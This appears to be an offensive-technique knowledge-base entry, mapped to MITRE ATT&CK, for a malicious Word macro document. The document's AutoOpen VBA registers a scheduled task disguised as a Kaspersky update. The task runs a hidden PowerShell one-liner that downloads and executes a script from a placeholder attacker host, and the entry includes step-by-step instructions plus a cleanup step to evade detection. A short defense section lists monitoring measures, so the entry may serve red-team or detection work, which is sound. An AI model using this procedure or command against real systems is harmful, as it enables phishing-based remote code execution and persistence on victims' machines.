---
id: 55f94a72-7c86-49b3-afb7-e1a667062a6b
name: >-
  VBA-Macro-to-Create-Scheduled-Task-for-PowerShell-Execution-Masquerading-as-Kaspersky-Update
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23.524383+00:00'
updated_at: '2023-04-10T20:36:51.537211+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Scheduled Task|T1053 - Scheduled Task]]'
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/DOCM - VBA Spawning via svchost.exe using Scheduled Task]]'
  - '[[tags/Office - Attacks]]'
  - vba-macro
  - scheduled-task
  - defense-evasion
commands:
  - '[[commands/powershell-download-and-execute]]'
platforms:
  - Windows
tools: []
validated: true
---

# VBA-Macro-to-Create-Scheduled-Task-for-PowerShell-Execution-Masquerading-as-Kaspersky-Update

## Summary

This procedure uses a malicious macro-enabled Microsoft Word document (.docm) to execute a VBA script that creates a scheduled task masquerading as a legitimate Kaspersky Anti-Virus update process. The task triggers PowerShell to download and execute a remote script, enabling evasion of detection while achieving code execution and potential persistence on Windows systems.

## Description

In this technique, an attacker crafts a .docm file containing VBA code in the AutoOpen subroutine, which automatically runs when the document is opened (assuming macros are enabled). The VBA interacts with the Windows Task Scheduler API to register a new task named "AVUpdateTask" attributed to "Kaspersky Corporation." The task is set to execute 30 seconds after creation, running PowerShell in hidden mode to fetch and invoke a script from a controlled server. This blends malicious activity with legitimate system processes, evading basic AV detection. The target environment is Windows systems with Microsoft Office installed and macro execution permitted. Success allows arbitrary code execution, such as payload download for further compromise.

## Requirements

1. Microsoft Word installed on a Windows system with macro support enabled.
2. Administrative privileges not required for task creation if run in user context, but higher impact if elevated.
3. Access to a controlled server hosting the remote PowerShell script (e.g., via HTTP).
4. Target user must open the .docm file and enable macros.

## Defense

- Disable VBA macros by default in Office policies and only enable for trusted documents.
- Use application whitelisting to block unsigned macros or Office execution of scripts.
- Monitor Task Scheduler for suspicious tasks with attributes like "Kaspersky Corporation" author or PowerShell arguments involving downloads.
- Implement endpoint detection for anomalous PowerShell execution (e.g., via AMSI, ETW logging) and network traffic to unexpected domains.
- Regularly audit scheduled tasks with tools like schtasks /query and remove unauthorized entries.

## Objectives

1. Evade detection by masquerading malicious execution as legitimate AV updates.
2. Achieve remote code execution via PowerShell download and invocation.
3. Establish persistence through scheduled task recurrence if modified.
4. Enable further attacks like data exfiltration or lateral movement.

## Instructions

### Step 1: Prepare the Malicious .docm File

**Context**: Create a new macro-enabled Word document and insert the VBA code to handle automatic execution upon opening. This sets up the delivery mechanism.

**Code** ([[codes/VBA-AutoOpen-to-Create-Scheduled-Task-for-PowerShell-Download]]):

Embed the provided VBA code into the document's VBA editor (Alt+F11 in Word).

> This step prepares the payload. Expected output: VBA module saved without syntax errors, visible in the VBA project explorer.

### Step 2: Configure the Scheduled Task Trigger and Action

**Context**: The VBA code connects to the Task Scheduler service, defines the task properties (author, start-when-available, not hidden), sets a time trigger for 30 seconds delay, and specifies the PowerShell execution path and arguments. This ensures the task runs shortly after document opening.

**Code Reference**: The embedded [[codes/VBA-AutoOpen-to-Create-Scheduled-Task-for-PowerShell-Download]] handles this automatically.

> Why: The delay allows the document to close normally before execution, reducing suspicion. Expected output: Task definition object created in memory without errors.

### Step 3: Register the Task and Execute PowerShell Download

**Context**: Register the task in the root folder with the name "AVUpdateTask" using principal level 3 (password not required) and logon type 6 (interactive token). The action invokes PowerShell to download and execute the remote script.

**Command** ([[commands/powershell-download-and-execute]]):

The VBA sets the arguments as:

```powershell
-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://$_ATTACKER_IP:80/$_SCRIPT_PATH'))
```

> This step finalizes registration and triggers the download. Expected output: Task registered successfully (verifiable via Task Scheduler GUI or schtasks /query /tn AVUpdateTask), and PowerShell executes the remote script without visible windows.

### Step 4: Verify Execution and Cleanup

**Context**: Confirm the task ran, the script executed, and optionally delete the task to avoid detection. Monitor for success via logs or callback from the downloaded script.

Use Windows Event Viewer (Microsoft-Windows-TaskScheduler/Operational) to check event ID 200 for task start.

> Why: Validates the technique worked and allows assessment of impact. Expected output: Event logs show task execution; any callbacks from the script confirm code ran. If needed, run `schtasks /delete /tn AVUpdateTask /f` to remove.
